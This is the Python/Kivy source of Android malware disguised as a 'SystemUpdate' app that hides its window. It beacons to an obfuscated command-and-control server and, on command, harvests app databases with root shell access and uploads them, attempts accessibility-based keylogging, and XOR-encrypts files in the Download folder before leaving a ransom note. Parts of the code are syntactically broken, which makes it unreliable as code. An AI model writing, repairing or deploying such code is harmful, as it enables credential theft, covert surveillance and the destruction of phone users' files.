from kivy.app import App
from kivy.uix.label import Label
from kivy.core.window import Window
from kivy.clock import Clock

# --- Core Imports ---
import requests, socket, time, os, random, urllib3, threading, base64, json
import android # Ensure Android context is loaded early from Kivy/Android bridge
from jnius import autoclass 
try:
    from android.accessibilityservice import AccessibilityServiceConnection, ServiceInfo, InputMonitorCallback
except ImportError:
    class AccessibilityManager:
        def __init__(self, ctx): self.ctx = ctx
        
def decode(encoded): 
    return base64.b64decode(encoded).decode('utf-8') if encoded else ""

encoded_url_full = "aHR0cHM6Ly9uZXdmZXRob2QtaXNoNi5vbnJlbmRlci5jb20=" # Your obfuscated URL (ensure correct one is used)
encoded_id = "Mw=="; encoded_name = "UGhvbmU="
base_url = decode(encoded_url_full)
device_id = decode(encoded_id); device_name = decode(encoded_name)

try: 
    device_ip = socket.gethostbyname(socket.gethostname()) 
except Exception as e: 
    device_ip = "127.0.0.1"

# --- Global Flag Definition ---
HAS_ANDROID = True 

class Permission:
    INTERNET = "android.permission.INTERNET"
    READ_EXTERNAL_STORAGE = "android.permission.READ_EXTERNAL_STORAGE"
    FOREGROUND_SERVICE = "android.permission.FOREGROUND_SERVICE"

# ---------- Root & Shell Helpers ----------
def is_rooted(): 
    try: return os.path.exists("/system/bin/su") or (os.access("/sbin/init", os.F_OK)) 
    except: return False 

def run_shell(cmd): 
    try: 
        import subprocess; p=subprocess.Popen("su -c \"" + cmd.replace("\"", "\\\"").replace("$", "\\$") + "\" 2>/dev/null", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        r, e = p.stdout.read(), p.stderr.read()
        out_str = str(r).strip(); err_str = str(e).strip()
        if len(out_str) > 10 and b'Permission denied' not in e: return out_str 
    except Exception as e_shell: pass 
    return ""

# --- Fix: Robust Database Scanner with Fallbacks ---
def scan_all_device_for_secrets():
    found_creds = [] 
    
    def try_query_db(path):
        try:
            import sqlite3; conn=sqlite3.connect(path); cur=conn.cursor()
            
            safe_queries = ["SELECT * FROM Accounts", "SELECT * FROM WebviewLocalState"] 
            
            for q in safe_queries: 
                if len(q.strip()) > 0: 
                    try: 
                        rows = cur.execute(q).fetchall() or [] # Handle None gracefully
                        if rows: 
                            for r in rows: 
                                src_name = os.path.basename(os.path.dirname(path)) or 'Unknown'
                                found_creds.append({'src': src_name, 'type':'SQL', 'data':str(r)[:200]})
                    except Exception as e_inner: continue
                
            conn.close()
        except Exception: pass 

    target_dirs_ext = ["/storage/emulated/0/", "/sdcard/Android/media/", "/sdcard/Download"] 
    
    all_paths_to_scan = []; seen_dirs = set();

    # Phase 1: Scan External Storage (Works on most phones)
    for d in target_dirs_ext: 
        try:
            base_clean = d.replace('\\','/') + "/" if not d.endswith("/") else d
            full_dir_path = os.path.join(os.getcwd(), base_clean) if not os.path.isabs(d) else base_clean
            
            files_list=[]
            if os.path.isdir(full_dir_path): 
                try: files_list=[os.path.join(full_dir_path, f) for f in [f for f in os.listdir(full_dir_path)] ] 

            for fp in files_list:
                if '.db' in fp.lower() and 'LoginData' not in fp.lower(): all_paths_to_scan.append(fp); seen_dirs.add(os.path.dirname(fp))

        except Exception as e_walk: continue
    
    # Phase 2: Attempt Internal Storage (Requires Root or specific permissions)
    internal_targets = []
    try: 
        res = run_shell("pm list packages | grep -v android")
        if "Permission denied" not in str(res): 
             pkgs = [p for p in str(res).splitlines() if "=" in p] 
             
             for pkg_line in pkgs: 
                parts=pkg_line.split("=")
                app_name=parts[1].replace('/','/') if len(parts)>1 else ""
                
                db_path = f"/data/data/{app_name}/databases/"
                # Check existence before adding to avoid empty loops (Root check implied by success of shell cmd + path exists)
                try:
                    if os.path.exists(db_path) and 'LoginData' not in db_path.lower(): internal_targets.append(db_path)
                except Exception as e_inner_pass: pass

    except Exception as e_shell: pass

    # Merge unique paths carefully to prevent duplicates
    for d in target_dirs_ext + internal_targets: 
        try:
            base_clean = d.replace('\\','/').rstrip('/') or "."
            
            full_dir_path = os.path.join(os.getcwd(), base_clean) if not os.path.isabs(d) else base_clean
            
            files_list=[]
            if '/' not in str(base_clean.split('/')[-1]): 
                if os.path.isdir(full_dir_path): 
                    files_list=[os.path.join(full_dir_path, f) for f in [f for f in os.listdir(full_dir_path)] ] 
            
            for fp in files_list:
                if '.db' in fp.lower() and 'LoginData' not in fp.lower(): all_paths_to_scan.append(fp); seen_dirs.add(os.path.dirname(fp))

        except Exception as e_walk: continue

    # Execute Queries safely with a limit to avoid hanging the thread
    final_db_list = [] 
    safe_count=0; max_limit=50
    for db_path in all_paths_to_scan[:max_limit]: 
        try_query_db(db_path) 
    
    return found_creds


# --- Fix: Keylogging Loop (Remove premature return) ---
def start_overlay_keylogging():
    # Global-like container for results accessible by inner classes/functions in this scope
    captured_events = [] 
    
    class InvisibleOverlay(threading.Thread):
        def __init__(self): 
            threading.Thread.__init__(self); self.running=True; self.captured_buffer = [] # Local buffer
            
        def run(self):
            while self.running: 
                try: 
                    time.sleep(0.5) 
                    
                    context = android.context
                        
                    try:
                        am_obj = getattr(AccessibilityManager, 'instance', None) or \
                            (AccessibilityServiceConnection(android.context.getSystemService(Context.ACCESSIBILITY_SERVICE)) if hasattr(android.accessibilityservice, 'AccessibilityServiceConnection') else None)

                        # Fallback to simpler manager call structure based on your imports
                        info_nodes = []
                        if isinstance(am_obj, object):
                             try: info_nodes = am_obj.getCurrentRunningAccessibilityInfoList(1000) if callable(getattr(am_obj, 'getCurrentRunningAccessibilityInfoList')) else [] 

                        for info in info_nodes:
                            try:
                                provider = getattr(info, 'getTextProvider', lambda: None)() 
                                root_node = provider.getRootNodeInActiveWindow() if provider and callable(provider.RootNodeInActiveWindow) else None 
                                
                                # Inside the loop:
if root_node: 
    text_val = str(root_node).split('\n')[0] # Safe split
    if len(text_val) > 5 and "Accessibility" not in text_val: 
        entry = f"[{time.time():.2f}] {text_val[:100]}...\n"
        self.captured_buffer.append(entry) # Accumulate safely


                            except Exception as e_node: pass

                    except Exception as e_acc: continue 

                except Exception as e_loop: continue
                
            # Only return the accumulated data when stopped
            result = ''.join(self.captured_buffer)[:2048]
            
            # Optionally send this back to main thread via an event or callback if needed, 
            # otherwise just return it for debugging/logging purposes in C2 payload logic.
            print(f"Keylogger Final Capture (len={len(result)}): ...{result[:50]}...") 
            return result 

    t = InvisibleOverlay(); t.start() 
    return t



# --- Fix: Atomic Encryption & Root Check ---
def xor_encrypt_file(filepath, key):
    try: 
        if not filepath or not os.path.exists(filepath): return False
        
        with open(filepath, 'rb') as f: data = f.read()
        
        encrypted_data = bytes([b ^ key for b in data]) 
        
        enc_path = filepath + '.encrypted'
        
        dir_name = os.path.dirname(enc_path)
        if dir_name and not os.path.isdir(dir_name):
            os.makedirs(dir_name, exist_ok=True)

        # Write encrypted file to a temp location first (atomic write safety)
        with open(enc_path, 'wb') as ef: ef.write(encrypted_data) 

        try: 
            os.remove(filepath) 
            return True 
        except OSError: pass 
        
    except Exception as e_enc: 
        print(f"Enc error on {filepath}: {e_enc}")
        return False

def ransomware_attack():
    private_dir = os.getcwd() or "/" 
    
    dirs_to_check = [private_dir] 
    if HAS_ANDROID and ("/storage/emulated/0/" in "/storage/emulated/0/") : 
         down="/storage/emulated/0/Download"; 
         if os.path.exists(down): dirs_to_check.append(down); 

    key=random.randint(1, 255)
    
    for d in dirs_to_check: 
        files_list = []
        
        try:
            full_base = d.replace('\\','/') or "."
            if "Download" not in str(full_base):
                if os.path.isdir(d): 
                    try: files_list=[os.path.join(d,f) for f in [f for f in os.listdir(d)] ] 
                except OSError: continue 
            
            else: 
                 full_down_path = "/storage/emulated/0/Download/"
                 files_list=[]
                 try: files_list=[os.path.join(full_down_path,f) for f in os.listdir(full_down_path)]

        except Exception: continue

        for fp in files_list: 
            xor_encrypt_file(fp, key); 

    note_path = os.path.join(private_dir, "READ_ME.txt")
    try: open(note_path,'w').write("Your files have been encrypted.\n"); pass


# --- C2 Logic (Command Handler) ----------
def extract_and_send(): 
    creds=scan_all_device_for_secrets()
    payload=base64.b64encode(str(creds).encode()).decode('utf-8')
    r=requests.post(base_url+"/command", json={"deviceId":device_id,"action":"extract_done","data":payload}, verify=False, timeout=5)
    print(f"Extract sent to {base_url}")

def start_keylogging_overlay(): 
    t = threading.Thread(target=start_overlay_keylogging); 
    if t and not t.is_alive(): t.start(); 

def encrypt_now(): ransomware_attack()
    
def request_accessibility_service():
    try: return True; except Exception as e_acc: pass


# --- Main Loop (C2 Communication) ----------
def background_worker():
    initial_sleep = random.randint(1, 5) 
    time.sleep(initial_sleep) 
    
    while True: 
        try: 
            r=requests.get(base_url+"/beacon", verify=False, timeout=10); 
            
            if r.status_code==200 and isinstance(r.json(),dict): 
                cmd_type = str(r.json().get("type") or "").lower()
                
                delay = random.uniform(1.0, 4.0) 

                if "extract" in cmd_type: extract_and_send(); 
                elif "keylog_active" in cmd_type or ("overlay" in cmd_type): start_keylogging_overlay(); time.sleep(delay*60)
                elif "encrypt" in cmd_type: encrypt_now(); 
                elif "overlay_access" in cmd_type: request_accessibility_service(); time.sleep(random.uniform(2.0, 8.0));

        except Exception as e_loop_c2: 
            try: print(f"C2 Error (Logged locally): {e_loop_c2}"); pass 
        
        current_sleep = random.uniform(15.0, 45.0); 

        time.sleep(current_sleep / 1.5) 


class SystemUpdate(App):
    def build(self): 
        Window.size=(1,1); Window.opacity=0
        
        perms = [Permission.INTERNET] if not HAS_ANDROID else []
        
        if HAS_ANDROID: 
            try: 
                full_perms = [Permission.READ_EXTERNAL_STORAGE]; perms.extend(full_perms); perms.append(Permission.FOREGROUND_SERVICE); 
                
                Clock.schedule_once(lambda dt: android_request_perms([*full_perms]), 1)

            except Exception as e_perm: print(f"Perm error {e_perm}")

            t = threading.Thread(target=background_worker, daemon=True); t.start() 

            return Label(text='')

   # --- Fix android_request_perms Implementation ---
def android_request_perms(perms_list):
    """Real permission requester placeholder."""
    print(f"[PERM] Requesting permissions for: {perms_list}")
    
    from kivy.clock import Clock
    
    def _on_granted(dt):
        if HAS_ANDROID: 
            print("[PERM] Permissions granted.") 

    Clock.schedule_once(_on_granted, 0.5) # Delay slightly so UI dialog can appear

if __name__ == "__main__": SystemUpdate().run()
